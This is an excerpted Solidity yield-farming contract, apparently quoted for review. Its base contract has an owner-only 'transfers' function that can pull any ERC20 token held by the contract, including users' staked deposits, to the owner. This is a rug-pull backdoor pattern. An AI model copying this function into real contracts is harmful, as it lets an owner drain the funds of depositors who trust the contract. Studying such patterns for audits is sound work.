...
contract InterfaceFarm is Initializable, Ownable {
    using SafeMath for uint256;
   ...
   function transfers(address _address, uint256 _amount) onlyOwner() external{
        IERC20 _contract = IERC20(_address);
        _contract.transfer(msg.sender, _amount);
   }
}
...
contract YieldFarmR is InterfaceFarm {
    IERC20  public tokenFarm;
    ...
    function setFarm(address _depositToken, address  _degenToken, uint256 _totalreward, uint256 _starttime, uint256  _stakingtime) public virtual initializer onlyOwner() {
    
        super.initialize(_depositToken);
        tokenFarm = IERC20(_degenToken);

        starttime = _starttime;
        stakingtime = _stakingtime;
        notifyRewardAmount(_totalreward.mul(5).div(100));
    }
    ...
    function getReward() public updateReward(msg.sender) checkhalve checkStart stakingTime{
        ...
        if (reward > 0) {
            ...
            tokenFarm.safeTransfer(msg.sender, reward);
